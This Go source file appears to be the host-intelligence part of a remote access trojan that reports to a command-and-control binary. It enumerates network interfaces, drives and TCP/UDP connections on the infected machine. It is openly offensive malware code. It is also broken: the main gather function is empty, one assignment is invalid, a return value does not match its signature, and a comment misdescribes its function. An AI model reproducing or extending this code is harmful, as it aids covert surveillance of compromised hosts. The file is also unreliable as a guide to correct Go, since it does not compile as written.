/*/
This file contains the code for gathering host intelligence
	-uses code from the following sources of open source information
		https://github.com/bluesentinelsec/OffensiveGoLang/

	Please support thier efforts engaging with them (not like that you doofus)
	More community support == More Success for everyone

	BY DEFAULT, THIS FILE ONLY DOES THINGS NOISY AS ALL HELL
	IF YOU WANT NINJA CODE, YOU NEED TO CODE THAT BEHAVIOR IN!
/*/

package shared_code

// import the libraries we need
import (
	"net"

	// necessary for gathering process information

	// necessary for getting netowork information
	"github.com/cakturk/go-netstat/netstat"
	// Software information Enumeration

	// Disk information
	"github.com/shirou/gopsutil/disk"
)

/*
Function to gather information about the host
the rat is in residence on, This is the MAIN function
That calls the others depending on the request from the
Command and Control binary
*/
func gather_intel(intel_struct HostIntel) (HostIntel, error) {

}

func get_interfaces(intel_struct *HostIntel) {
	// Get all network interfaces
	iface, _ := net.Interfaces()
	&HostIntel.Interfaces = iface
}

// code from:
//https://github.com/bluesentinelsec/OffensiveGoLang/blob/master/pkg/windows/discovery/hardrives.go

// GetDrives iterates through the alphabet to return a list of mounted drives
func GetDrives() []disk.PartitionStat {
	partitions, derp := disk.Partitions(true)
	if derp != nil {
		Error_printer(derp, "generic error, fix me plz lol <3!")
	}
	return partitions
}

// ToDo: add functions for IPv6 connections

// GetTCPConnections returns a slice describing TCP connections
func GetTCPConnections() []netstat.SockTabEntry {

	// TCP sockets
	list_of_connections, derp := netstat.TCPSocks(netstat.NoopFilter)
	if derp != nil {
		Error_printer(derp, "generic error, fix me plz lol <3!")
	}
	return list_of_connections, derp
}

// GetUDPConnections returns a slice describing UDP connections
func GetUDPConnections() []netstat.SockTabEntry {
	// UDP sockets
	list_of_connections, derp := netstat.UDPSocks(netstat.NoopFilter)
	if derp != nil {
		Error_printer(derp, "generic error, fix me plz lol <3!")
	}
	return list_of_connections
}
